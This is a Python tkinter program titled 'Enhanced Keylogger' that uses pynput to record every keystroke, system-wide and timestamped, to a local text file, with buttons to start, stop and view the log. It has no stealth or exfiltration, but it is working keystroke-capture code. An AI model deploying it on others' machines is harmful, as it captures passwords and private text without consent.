import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
from pynput import keyboard
import threading
import time
import os


def draw_gradient(canvas, color1, color2):
    width = root.winfo_width()
    height = root.winfo_height()
    gradient = int(height / 256)
    for i in range(256):
        color = f"#{i:02x}{(255-i):02x}{(128+i//2):02x}"  
        canvas.create_line(0, i * gradient, width, i * gradient, fill=color)


root = tk.Tk()
root.title("Enhanced Keylogger")
root.geometry("400x300")
root.resizable(False, False)


canvas = tk.Canvas(root, width=400, height=300)
canvas.pack(fill="both", expand=True)
canvas.update()

draw_gradient(canvas, "#FF5733", "#C70039")


log_file = "keylog.txt"
is_logging = False
listener = None

def log_keystroke(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [{key}]\n")

def on_press(key):
    if is_logging:
        log_keystroke(key)

def on_release(key):
    if key == keyboard.Key.esc:
        stop_logging()
        return False

def start_logging():
    global is_logging, listener
    if not is_logging:
        is_logging = True
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        status_label.config(text="Logging started...", fg="green")
        start_button.config(state="disabled")
        stop_button.config(state="normal")
    else:
        messagebox.showwarning("Warning", "Keylogging is already active!")

def stop_logging():
    global is_logging, listener
    if is_logging:
        is_logging = False
        if listener:
            listener.stop()
            listener = None
        status_label.config(text="Logging stopped...", fg="red")
        start_button.config(state="normal")
        stop_button.config(state="disabled")
    else:
        messagebox.showwarning("Warning", "Keylogging is not active!")

def choose_log_file():
    global log_file
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
    if file_path:
        log_file = file_path
        status_label.config(text=f"Log file set to: {os.path.basename(log_file)}", fg="blue")

def view_log():
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            log_data = f.read()
        log_window = tk.Toplevel(root)
        log_window.title(f"Log - {os.path.basename(log_file)}")
        log_window.geometry("400x300")
        log_text = scrolledtext.ScrolledText(log_window, wrap=tk.WORD, state='normal')
        log_text.insert(tk.INSERT, log_data)
        log_text.pack(expand=True, fill='both')
        log_text.config(state='disabled')
    else:
        messagebox.showerror("Error", "Log file does not exist!")

start_button = tk.Button(canvas, text="Start Logging", command=start_logging, width=20, bg="green", fg="white")
start_button_window = canvas.create_window(200, 70, anchor="center", window=start_button)


stop_button = tk.Button(canvas, text="Stop Logging", command=stop_logging, width=20, bg="red", fg="white")
stop_button_window = canvas.create_window(200, 110, anchor="center", window=stop_button)

choose_file_button = tk.Button(canvas, text="Choose Log File", command=choose_log_file, width=20, bg="blue", fg="white")
choose_file_button_window = canvas.create_window(200, 150, anchor="center", window=choose_file_button)

view_log_button = tk.Button(canvas, text="View Log", command=view_log, width=20, bg="purple", fg="white")
view_log_button_window = canvas.create_window(200, 190, anchor="center", window=view_log_button)

status_label = tk.Label(canvas, text="Not logging...", fg="black")
status_label_window = canvas.create_window(200, 230, anchor="center", window=status_label)

root.mainloop()
